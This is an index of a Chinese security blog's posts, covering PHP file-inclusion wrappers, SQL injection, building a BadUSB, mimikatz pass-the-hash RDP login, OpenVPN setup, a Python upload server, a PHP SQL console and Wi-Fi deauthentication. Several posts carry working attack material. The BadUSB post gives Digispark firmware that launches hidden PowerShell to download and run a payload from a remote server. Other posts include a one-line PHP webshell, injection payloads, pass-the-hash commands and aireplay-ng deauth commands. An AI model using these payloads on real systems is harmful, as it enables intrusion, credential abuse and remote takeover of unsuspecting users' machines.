[{"title":"404图案","url":"/2022/11/04/404%E5%9B%BE%E6%A1%88/","content":"<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">         .----.</span><br><span class=\"line\">      _.&#x27;__    `.</span><br><span class=\"line\">  .--(4)(04)---/#\\</span><br><span class=\"line\">.&#x27; @          /###\\</span><br><span class=\"line\">:         ,   #####</span><br><span class=\"line\"> `-..__.-&#x27; _.-\\###/</span><br><span class=\"line\">       `;_:    `&quot;&#x27;</span><br><span class=\"line\">     .&#x27;&quot;&quot;&quot;&quot;&quot;`.</span><br><span class=\"line\">    /, Not ,\\\\</span><br><span class=\"line\">   // Found! \\\\</span><br><span class=\"line\">   `-._______.-&#x27;</span><br><span class=\"line\">   ___`. | .&#x27;___</span><br><span class=\"line\">  (______|______)</span><br></pre></td></tr></table></figure>\n\n","categories":["乱八七糟"],"tags":["颜文字"]},{"title":"PHP伪协议-文件包含","url":"/2021/12/24/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","content":"<h2 id=\"lfi-php案例代码\"><a href=\"#lfi-php案例代码\" class=\"headerlink\" title=\"lfi.php案例代码\"></a>lfi.php案例代码</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\tinclude $_GET[&#x27;file&#x27;];</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"phar-、zip-、zlib-协议特性\"><a href=\"#phar-、zip-、zlib-协议特性\" class=\"headerlink\" title=\"phar:&#x2F;&#x2F;、zip:&#x2F;&#x2F;、zlib:&#x2F;&#x2F; 协议特性\"></a>phar:&#x2F;&#x2F;、zip:&#x2F;&#x2F;、zlib:&#x2F;&#x2F; 协议特性</h2><p>​\t\t用于读取压缩文件，zip:&#x2F;&#x2F; 、phart:&#x2F;&#x2F; 、zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀: jpg、png、gif、xxx等等。</p>\n<h3 id=\"php-input\"><a href=\"#php-input\" class=\"headerlink\" title=\"php:&#x2F;&#x2F;input\"></a>php:&#x2F;&#x2F;input</h3><p>​\t\tphp:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。</p>\n<p><code>注:当enctype=&quot;multipart/form-data&quot;，php://input 是无效的。</code></p>\n<p><img src=\"/../images/image-20230918020512611.png\" alt=\"image-20230918020512611\"></p>\n<h3 id=\"zip\"><a href=\"#zip\" class=\"headerlink\" title=\"zip:&#x2F;&#x2F;\"></a>zip:&#x2F;&#x2F;</h3><p>​\t如果不允许上传zip格式文件，可修改后缀为图片格式，<strong>phar协议和zip协议会无视利用的是什么包。</strong><br> <code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名] (#编码为%23)</code></p>\n<p><img src=\"/../images/image-20230918020635478.png\" alt=\"image-20230918020635478\"></p>\n<p><img src=\"/../images/image-20230918020659405.png\" alt=\"image-20230918020659405\"></p>\n<h3 id=\"phar\"><a href=\"#phar\" class=\"headerlink\" title=\"phar:&#x2F;&#x2F;\"></a>phar:&#x2F;&#x2F;</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># shell.jpg</span><br><span class=\"line\">&lt;?php @eval($_REQUEST[1]);?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20230918020743413.png\" alt=\"image-20230918020743413\"></p>\n<h3 id=\"compress-zlib\"><a href=\"#compress-zlib\" class=\"headerlink\" title=\"compress.zlib:&#x2F;&#x2F;\"></a>compress.zlib:&#x2F;&#x2F;</h3><p><img src=\"/../images/image-20230918020820421.png\" alt=\"image-20230918020820421\"></p>\n<p><code>如果是zip压缩包，后面不需要跟子文件</code></p>\n<p><img src=\"/../images/image-20230918020840976.png\" alt=\"image-20230918020840976\"></p>\n<p><img src=\"/../images/image-20230918020853024.png\" alt=\"image-20230918020853024\"></p>\n<h3 id=\"data-text-plain\"><a href=\"#data-text-plain\" class=\"headerlink\" title=\"data:&#x2F;&#x2F;text&#x2F;plain\"></a>data:&#x2F;&#x2F;text&#x2F;plain</h3><p><img src=\"/../images/image-20230918020913453.png\" alt=\"image-20230918020913453\"></p>\n<p><img src=\"/../images/image-20230918020927543.png\" alt=\"image-20230918020927543\"></p>\n","categories":["PHP安全"],"tags":["PHP","伪协议","文件包含"]},{"title":"SQL注入(从order by、insert、update、delete等方式注入)","url":"/2021/05/24/SQL%E6%B3%A8%E5%85%A5-%E4%BB%8Eorder-by%E3%80%81insert%E3%80%81update%E3%80%81delete%E7%AD%89%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5/","content":"<h3 id=\"order-by注入\"><a href=\"#order-by注入\" class=\"headerlink\" title=\"order by注入\"></a>order by注入</h3><p>​\t\t在不知道列名的情况下可以通过列的的序号来指代相应的列，但是经过测试这里是无法进行运算的，如<strong>order&#x3D;3-1</strong>和<strong>order&#x3D;2</strong>是不一样的。但是支持函数调用，如下图：</p>\n<p><img src=\"/../images/image-20231016002830773.png\" alt=\"image-20231016002830773\"></p>\n<ul>\n<li>报错注入：当order by注入处能<strong>返回错误信息</strong>时，可以考虑使用报错注入。</li>\n</ul>\n<p><img src=\"/../images/image-20231016002656611.png\" alt=\"image-20231016002656611\"></p>\n<ul>\n<li>延迟注入</li>\n</ul>\n<p><img src=\"/../images/image-20231016002741525.png\" alt=\"image-20231016002741525\"></p>\n<p><strong>Order by可以根据多列排序，因此注入的语句不一定限制在order by的第一个参数，也可以通过逗号去对<em>新的列</em>进行注入。</strong></p>\n<h3 id=\"insert注入\"><a href=\"#insert注入\" class=\"headerlink\" title=\"insert注入\"></a>insert注入</h3><ul>\n<li><p>报错注入：<code>or updatexml(1,concat(0x7e,database()),0)</code></p>\n<p><img src=\"/../images/image-20231016003101391.png\" alt=\"image-20231016003101391\"></p>\n</li>\n<li><p>二次注入</p>\n</li>\n</ul>\n<p><img src=\"/../images/image-20231016003205704.png\" alt=\"image-20231016003205704\"></p>\n<ul>\n<li>查询当前数据库下的所有表</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">insert into user (username,password) values </span><br><span class=\"line\">(&#x27;xiaoming&#x27;,</span><br><span class=\"line\">(select group_concat(table_name) from information_schema.tables where table_schema=database())</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20231016003341441.png\" alt=\"image-20231016003341441\"></p>\n<p><strong>除了常规的单行记录插入，还可以尝试多行记录插入；通过第二列数据的插入还能爆出插入的字段数有多少个</strong></p>\n<h3 id=\"update注入\"><a href=\"#update注入\" class=\"headerlink\" title=\"update注入\"></a>update注入</h3><ul>\n<li>报错注入</li>\n</ul>\n<p><img src=\"/../images/image-20231016003541742.png\" alt=\"image-20231016003541742\"></p>\n<ul>\n<li><p>延迟注入</p>\n<p><img src=\"/../images/image-20231016003630190.png\" alt=\"image-20231016003630190\"></p>\n</li>\n</ul>\n<h3 id=\"delete注入\"><a href=\"#delete注入\" class=\"headerlink\" title=\"delete注入\"></a>delete注入</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">dalete from users where id=2 or updatexml(1,concat(0x7e,database()),0)</span><br><span class=\"line\">dalete from users where id=2 or sleep(3)</span><br></pre></td></tr></table></figure>\n\n<p><strong>谨慎使用，避免误删数据</strong></p>\n","categories":["SQL注入"],"tags":["MySQL","order by","insert","update","delete"]},{"title":"badusb制作","url":"/2023/10/01/badusb%E5%88%B6%E4%BD%9C/","content":"<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>&ensp;&ensp;&ensp;&ensp;不同于老式的U盘病毒，它利用了USB协议中的一个漏洞，通过模拟键盘、鼠标、网卡等从而让目标电脑执行恶意代码，达到控住主机或者窃取敏感信息等目的。</p>\n<p>&ensp;&ensp;&ensp;&ensp;利用了HID界面和相关协议，在代码层级模拟键盘或者鼠标的操作，达到恶意传播病毒或者删除关键文件的目的。</p>\n<p>&ensp;&ensp;&ensp;&ensp;<strong>恶意代码存在于U盘的固件中，PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法防御BadUSB的攻击</strong>。</p>\n<p><strong>硬件设备（Digispark开发板）</strong></p>\n<p>&ensp;&ensp;&ensp;&ensp;基于ATTINY85微控制器的USB开发板，体积小且价钱便宜，功能方面则没有Arduino般强大。 代码与Arduino大同小异，更可贵的是<strong>使用Arduino IDE来开发</strong>。</p>\n<h3 id=\"攻击方式\"><a href=\"#攻击方式\" class=\"headerlink\" title=\"攻击方式\"></a>攻击方式</h3><ol>\n<li>物理入侵，简单点找一些未锁屏的办公电脑挨个插入。</li>\n<li>U盘钓鱼，通过伪装成一个普通移动U盘撒向目标范围内引起目标注意。</li>\n<li>摆渡攻击，通常是攻击局域网内部系统，当再次插入互联网设备中敏感信息被传输。</li>\n</ol>\n<h3 id=\"购买途径\"><a href=\"#购买途径\" class=\"headerlink\" title=\"购买途径\"></a>购买途径</h3><p>某宝上直接就能购买，我买的是Digispark开发板</p>\n<p><img src=\"/../images/image-20231001174746620.png\" alt=\"image-20231001174746620\"></p>\n<h3 id=\"制作badusb\"><a href=\"#制作badusb\" class=\"headerlink\" title=\"制作badusb\"></a>制作badusb</h3><p>&ensp;&ensp;&ensp;&ensp;下载Arduino IDE，安装驱动：<a href=\"https://github.com/digistump/DigistumpArduino/releases\">https://github.com/digistump/DigistumpArduino/releases</a> </p>\n<p> （因为我的板子是Digispark开发板，Arduino IDE默认不支持该板子，需要下载对应的驱动）</p>\n<p><img src=\"/../images/image-20231001174856995.png\" alt=\"image-20231001174856995\"></p>\n<p>选择64位，进行安装</p>\n<p><img src=\"/../images/image-20231001174912387.png\" alt=\"image-20231001174912387\"></p>\n<p>确保所有驱动都勾选上，进行安装；安装好后，重启电脑</p>\n<p><img src=\"/../images/image-20231001174932215.png\" alt=\"image-20231001174932215\"></p>\n<p>打开Arduino IDE，先配置代理，避免后续因为下载问题</p>\n<p><img src=\"/../images/image-20231001175024665.png\" alt=\"image-20231001175024665\"></p>\n<p>&ensp;&ensp;&ensp;&ensp;打开偏好设置，附加开发板管理器网址：<a href=\"http://digistump.com/package_digistump_index.json\">http://digistump.com/package_digistump_index.json</a> \t（因为Ardunio IDE默认没有Digispark开发板，需要手动添加）</p>\n<p><img src=\"/../images/image-20231001175050708.png\" alt=\"image-20231001175050708\"></p>\n<p>打开开发板管理器，选择安装 Digistump AVR Boards</p>\n<p><img src=\"/../images/image-20231001175110135.png\" alt=\"image-20231001175110135\"></p>\n<p>安装好后，就可以选择Digispark板子了</p>\n<p><img src=\"/../images/image-20231001175157105.png\" alt=\"image-20231001175157105\"></p>\n<p>选择example中的keyboard案例</p>\n<p><img src=\"/../images/image-20231001175217975.png\" alt=\"image-20231001175217975\"></p>\n<p>利用CS生成powershell脚本来上线，并把powershell脚本托管到服务器上</p>\n<p><img src=\"/../images/image-20231001175240333.png\" alt=\"image-20231001175240333\"></p>\n<p>需要烧制到板子上的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &quot;DigiKeyboard.h&quot;</span><br><span class=\"line\">#define KEY_ESC 41</span><br><span class=\"line\">#define KEY_BACKSPACE 42</span><br><span class=\"line\">#define KEY_TAB 43</span><br><span class=\"line\">#define KEY_PRT_SCR 70</span><br><span class=\"line\">#define KEY_DELETE 76</span><br><span class=\"line\"> </span><br><span class=\"line\">void setup() &#123;</span><br><span class=\"line\">  DigiKeyboard.delay(5000);</span><br><span class=\"line\">  DigiKeyboard.sendKeyStroke(0);</span><br><span class=\"line\">  DigiKeyboard.delay(3000);</span><br><span class=\"line\">  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</span><br><span class=\"line\">  DigiKeyboard.delay(1000);</span><br><span class=\"line\">  DigiKeyboard.print(F(&quot;powershell -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://xx.xx.xx.xx/payload.ps1&#x27;);&quot;));</span><br><span class=\"line\">  DigiKeyboard.delay(500);</span><br><span class=\"line\">  DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class=\"line\">  DigiKeyboard.delay(750);</span><br><span class=\"line\">  DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void loop() &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>修改payload脚本的地址即可，直接点击上传，提示需要60秒内插入板子</p>\n<p><img src=\"/../images/image-20231001175320214.png\" alt=\"image-20231001175320214\"></p>\n<p>插入板子，写入成功</p>\n<p><img src=\"/../images/image-20231001175339032.png\" alt=\"image-20231001175339032\"></p>\n<p>把badusd重新插入到电脑上，机器成功上线</p>\n<p><img src=\"/../images/image-20231001175352585.png\" alt=\"image-20231001175352585\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>&ensp;&ensp;&ensp;&ensp;在 Arduino 开发环境中，使用开发板管理器可以轻松安装和管理各种硬件平台的支持，包括不同的微控制器和开发板。默认情况下，Arduino IDE 附带一些常见的开发板支持，但对于其他特定的开发板或微控制器，可能需要添加附加的开发板支持。</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><ul>\n<li>参考视频：<a href=\"https://www.bilibili.com/video/av18699066\">https://www.bilibili.com/video/av18699066</a></li>\n<li>驱动下载地址：<a href=\"https://github.com/digistump/DigistumpArduino/releases\">https://github.com/digistump/DigistumpArduino/releases</a></li>\n<li>Arduino IDE代码生成器：<a href=\"https://github.com/Catboy96/Automator\">https://github.com/Catboy96/Automator</a></li>\n</ul>\n","categories":["硬件安全"],"tags":["嵌入式","Ardunio IDE","badusb","Digispark","硬件安全"]},{"title":"利用mimikatz使用NTLM凭证登录RDP","url":"/2023/08/30/%E5%88%A9%E7%94%A8mimikatz%E4%BD%BF%E7%94%A8NTLM%E5%87%AD%E8%AF%81%E7%99%BB%E5%BD%95RDP/","content":"<h3 id=\"hash登陆RDP远程桌面\"><a href=\"#hash登陆RDP远程桌面\" class=\"headerlink\" title=\"hash登陆RDP远程桌面\"></a>hash登陆RDP远程桌面</h3><p>第一步：开启Restricted Admin mode</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">REG ADD &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br><span class=\"line\">REG query &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; | findstr &quot;DisableRestrictedAdmin&quot; // 查看是否已开启，0x0则表示开启</span><br></pre></td></tr></table></figure>\n\n<p>第二步：利用mimikatz使用NTLM凭证登录RDP </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">privilege::debug</span><br><span class=\"line\">sekurlsa::pth /user:administrator /domain:. /ntlm:3667d84470exxxxxxxxx0a5ad69458 &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br><span class=\"line\">// 会弹出mstsc窗口，输入正确的IP地址即可连接</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><ul>\n<li><a href=\"https://xz.aliyun.com/t/8574\">https://xz.aliyun.com/t/8574</a></li>\n</ul>\n","categories":["乱八七糟"],"tags":["RDP","3389","mimikatz","NTLM"]},{"title":"openVPN简单搭建","url":"/2023/09/15/openVPN%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA/","content":"<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>​\t在电脑生成一张虚拟网卡，可以 hook网络层的请求</p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p>服务端下载openVPN的安装脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -O https://raw.githubusercontent.com/openvpn-install/master/openvpn-install.sh</span><br><span class=\"line\">chmod +x openvpn-install.sh &amp;&amp; ./openvpn-install.sh</span><br></pre></td></tr></table></figure>\n\n<p>确认是否是当前VPS的IP地址</p>\n<p><img src=\"/../images/image-20230915021521613.png\" alt=\"image-20230915021521613\"></p>\n<p>自动检测是否支持IPv6，提示不支持</p>\n<p><img src=\"/../images/image-20230915021604336.png\" alt=\"image-20230915021604336\"></p>\n<p>直接默认端口，也可以自定义端口</p>\n<p><img src=\"/../images/image-20230915021649497.png\" alt=\"image-20230915021649497\"></p>\n<p>提示UDP更快，选择UDP</p>\n<p><img src=\"/../images/image-20230915021707904.png\" alt=\"image-20230915021707904\"></p>\n<p>DNS选择默认的，直接回车</p>\n<p><img src=\"/../images/image-20230915021726635.png\" alt=\"image-20230915021726635\"></p>\n<p>后续两个询问全是默认回车即可</p>\n<p><img src=\"/../images/image-20230915021744285.png\" alt=\"image-20230915021744285\"></p>\n<p>最后配置账号和密码，服务端需要重启才能生效，<code>用户名.ovpn</code>文件生成在root目录下</p>\n<p>Mac使用Tunnelblick导入配置ovpn文件，连接输入密码即可</p>\n<p><img src=\"/../images/image-20230915021905820.png\" alt=\"image-20230915021905820\"></p>\n","categories":["乱八七糟"],"tags":["openVPN","代理","梯子"]},{"title":"基于python实现简易的文件服务器","url":"/2022/11/05/%E5%9F%BA%E4%BA%8Epython%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93%E7%9A%84%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/","content":"<h3 id=\"file-server端代码\"><a href=\"#file-server端代码\" class=\"headerlink\" title=\"file_server端代码\"></a>file_server端代码</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;Extend Python&#x27;s built in HTTP server to save files</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">curl or wget can be used to send files with options similar to the following</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">  curl -X PUT --upload-file somefile.txt http://localhost:8000</span></span><br><span class=\"line\"><span class=\"string\">  wget -O- --method=PUT --body-file=somefile.txt http://localhost:8000/somefile.txt</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">__Note__: curl automatically appends the filename onto the end of the URL so</span></span><br><span class=\"line\"><span class=\"string\">the path can be omitted.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"keyword\">import</span> http.server <span class=\"keyword\">as</span> server</span><br><span class=\"line\"><span class=\"keyword\">except</span> ImportError:</span><br><span class=\"line\">    <span class=\"comment\"># Handle Python 2.x</span></span><br><span class=\"line\">    <span class=\"keyword\">import</span> SimpleHTTPServer <span class=\"keyword\">as</span> server</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">HTTPRequestHandler</span>(server.SimpleHTTPRequestHandler):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Extend SimpleHTTPRequestHandler to handle PUT requests&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">do_PUT</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;Save a file following a HTTP PUT request&quot;&quot;&quot;</span></span><br><span class=\"line\">        filename = os.path.basename(self.path)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Don&#x27;t overwrite files</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> os.path.exists(filename):</span><br><span class=\"line\">            self.send_response(<span class=\"number\">409</span>, <span class=\"string\">&#x27;Conflict&#x27;</span>)</span><br><span class=\"line\">            self.end_headers()</span><br><span class=\"line\">            reply_body = <span class=\"string\">&#x27;&quot;%s&quot; already exists\\n&#x27;</span> % filename</span><br><span class=\"line\">            self.wfile.write(reply_body.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">        file_length = <span class=\"built_in\">int</span>(self.headers[<span class=\"string\">&#x27;Content-Length&#x27;</span>])</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(filename, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> output_file:</span><br><span class=\"line\">            output_file.write(self.rfile.read(file_length))</span><br><span class=\"line\">        self.send_response(<span class=\"number\">201</span>, <span class=\"string\">&#x27;Created&#x27;</span>)</span><br><span class=\"line\">        self.end_headers()</span><br><span class=\"line\">        reply_body = <span class=\"string\">&#x27;Saved &quot;%s&quot;\\n&#x27;</span> % filename</span><br><span class=\"line\">        self.wfile.write(reply_body.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    server.test(HandlerClass=HTTPRequestHandler)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"启动服务\"><a href=\"#启动服务\" class=\"headerlink\" title=\"启动服务\"></a>启动服务</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python file_server.py</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20230925020404923.png\" alt=\"image-20230925020404923\"></p>\n<h3 id=\"上传文件\"><a href=\"#上传文件\" class=\"headerlink\" title=\"上传文件\"></a>上传文件</h3><p>两种方式</p>\n<ul>\n<li><p>curl -X PUT –upload-file somefile.txt <a href=\"http://localhost:8000/\">http://localhost:8000</a> </p>\n</li>\n<li><p>wget -O- –method&#x3D;PUT –body-file&#x3D;somefile.txt <a href=\"http://localhost:8000/somefile.txt\">http://localhost:8000/somefile.txt</a></p>\n</li>\n</ul>\n<p><img src=\"/../images/image-20230925020720967.png\" alt=\"image-20230925020720967\"></p>\n<p>查看服务端，可以看到已经上传的文件</p>\n<p><img src=\"/../images/image-20230925020754030.png\" alt=\"image-20230925020754030\"></p>\n<p><code>1.log文件地址：http://xx.xx.xx.xx:8000/1.log</code></p>\n","categories":["python"],"tags":["文件服务器","python","文件存储"]},{"title":"基于PHP简易版MySQL可视化脚本","url":"/2023/09/27/%E5%9F%BA%E4%BA%8EPHP%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93%E7%89%88%E7%9A%84MySQL%E5%8F%AF%E8%A7%86%E5%8C%96%E8%84%9A%E6%9C%AC/","content":"<h3 id=\"mysql-manager-php\"><a href=\"#mysql-manager-php\" class=\"headerlink\" title=\"mysql_manager.php\"></a>mysql_manager.php</h3><p>上传脚本到服务器即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\"> &lt;html&gt;</span><br><span class=\"line\"> &lt;head&gt;</span><br><span class=\"line\">     &lt;title&gt;执行MySQL语句&lt;/title&gt;</span><br><span class=\"line\"> &lt;/head&gt;</span><br><span class=\"line\"> &lt;body&gt;</span><br><span class=\"line\">     &lt;h1&gt;执行MySQL语句&lt;/h1&gt;</span><br><span class=\"line\">     &lt;form method=&quot;POST&quot; action=&quot;&quot;&gt;</span><br><span class=\"line\">         &lt;textarea name=&quot;sql_statement&quot; rows=&quot;5&quot; cols=&quot;50&quot; placeholder=&quot;请输入MySQL语句&quot;&gt;&lt;/textarea&gt;</span><br><span class=\"line\">         &lt;br&gt;</span><br><span class=\"line\">         &lt;input type=&quot;submit&quot; value=&quot;执行&quot;&gt;</span><br><span class=\"line\">     &lt;/form&gt;</span><br><span class=\"line\">     &lt;?php</span><br><span class=\"line\">     // 检查是否提交了表单</span><br><span class=\"line\">     if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class=\"line\">         // 获取用户输入的MySQL语句</span><br><span class=\"line\">         $sql_statement = $_POST[&#x27;sql_statement&#x27;];</span><br><span class=\"line\">         // 连接MySQL数据库</span><br><span class=\"line\">         $host = &#x27;localhost&#x27;;</span><br><span class=\"line\">         $username = &#x27;root&#x27;;</span><br><span class=\"line\">         $password = &#x27;123456&#x27;;</span><br><span class=\"line\">         $database = &#x27;mysql&#x27;;</span><br><span class=\"line\">         $connection = mysqli_connect($host, $username, $password, $database);</span><br><span class=\"line\">         // 执行MySQL查询</span><br><span class=\"line\">         $result = mysqli_query($connection, $sql_statement);</span><br><span class=\"line\">         // 检查查询结果</span><br><span class=\"line\">         if ($result) &#123;</span><br><span class=\"line\">             // 回显查询结果</span><br><span class=\"line\">             echo &#x27;&lt;h2&gt;查询结果：&lt;/h2&gt;&#x27;;</span><br><span class=\"line\">             while ($row = mysqli_fetch_assoc($result)) &#123;</span><br><span class=\"line\">                 echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class=\"line\">                 print_r($row);</span><br><span class=\"line\">                 echo &#x27;&lt;/pre&gt;&#x27;;</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">         &#125; else &#123;</span><br><span class=\"line\">             // 显示错误消息</span><br><span class=\"line\">             echo &#x27;&lt;h2&gt;错误：&lt;/h2&gt;&#x27;;</span><br><span class=\"line\">             echo &#x27;&lt;p&gt;&#x27; . mysqli_error($connection) . &#x27;&lt;/p&gt;&#x27;;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">         // 关闭数据库连接</span><br><span class=\"line\">         mysqli_close($connection);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     ?&gt;</span><br><span class=\"line\"> &lt;/body&gt;</span><br><span class=\"line\"> &lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>使用时，修改如下参数</p>\n<p><img src=\"/../images/image-20231016005053345.png\" alt=\"image-20231016005053345\"></p>\n<p>使用案例</p>\n<p><img src=\"/../images/image-20231016005127255.png\" alt=\"image-20231016005127255\"></p>\n","categories":["PHP脚本"],"tags":["PHP","MySQL"]},{"title":"突破关闭SSID广播的WiFi","url":"/2020/12/14/%E7%AA%81%E7%A0%B4%E5%85%B3%E9%97%ADSSID%E5%B9%BF%E6%92%AD%E7%9A%84WiFi/","content":"<h3 id=\"SSID广播的概念\"><a href=\"#SSID广播的概念\" class=\"headerlink\" title=\"SSID广播的概念\"></a>SSID广播的概念</h3><p>​\t\t这里的SSID通常指ESSID(WIFI名字)，用来区分不同的无线网络，是用户给自己的无线网络所取的名字。SSID广 播就是指无线路由器不断的发送自己的SSID，使得周围的无线客户端能够搜索到自己的网络名称,进而可以输入密码后进行连接。</p>\n<p>​\t\t关闭了无线路由器的SSID广播功能之后，正常情况下无线客户端无法直接搜索到无线网络的名称。但是要特别强调，关闭SSID广播功能仅仅是关闭了无线路由器广播信标帧中的SSID部分，并不代表无线路由器的无线信号就不发射和接收了。在客户端手动添加SSID和密码的情况下依然可以正常连接。</p>\n<h3 id=\"DeAuth攻击原理\"><a href=\"#DeAuth攻击原理\" class=\"headerlink\" title=\"DeAuth攻击原理\"></a>DeAuth攻击原理</h3><ol>\n<li><p>发现目标网络：攻击者首先确定目标Wi-Fi网络以及连接到该网络的设备。</p>\n</li>\n<li><p>发送Deauthentication帧：攻击者伪造并发送Deauthentication帧到目标设备。这些帧会模仿合法的Deauthentication帧，使设备认为是无线接入点发出的断开连接信号。</p>\n</li>\n<li><p>断开连接：当目标设备接收到伪造的Deauthentication帧时，它们会解释为断开与Wi-Fi网络的连接的信号，从而使设备失去网络连接。</p>\n</li>\n<li><p>重新连接：在被断开连接后，受影响的设备通常会尝试自动重新连接到网络。然而，如果攻击者持续发送Deauthentication帧，设备可能会在重新连接时遇到困难。</p>\n</li>\n</ol>\n<h3 id=\"DeAuth攻击获取SSID\"><a href=\"#DeAuth攻击获取SSID\" class=\"headerlink\" title=\"DeAuth攻击获取SSID\"></a>DeAuth攻击获取SSID</h3><ol>\n<li><p>激活网卡监听模式：airmon-ng start wlan0 </p>\n</li>\n<li><p>探测无线网络：airodump-ng wlan0mon </p>\n</li>\n<li><p>新建终端窗口进行DeAuth攻击：aireplay-ng -0 5 -a [BSSID] -C [STATION] wlan0mon </p>\n<p>参数解释：-0 采用deauth攻击模式，5为攻击次数，-a 后跟AP的MAC地址，-c 后跟客户端的MAC地址；因为不确定哪个客户端连接该WIFI，即可以多次更换STATION来执行该命令，直到获取SSID</p>\n</li>\n<li><p>获取SSID</p>\n</li>\n</ol>\n<p><strong>kali自带 Aircrack-ng 套件</strong></p>\n<p>下图中红色箭头所指处，表示关闭了SSID广播的，暂时还不知道WiFi名字</p>\n<p><img src=\"/../images/image-20231016012017447.png\" 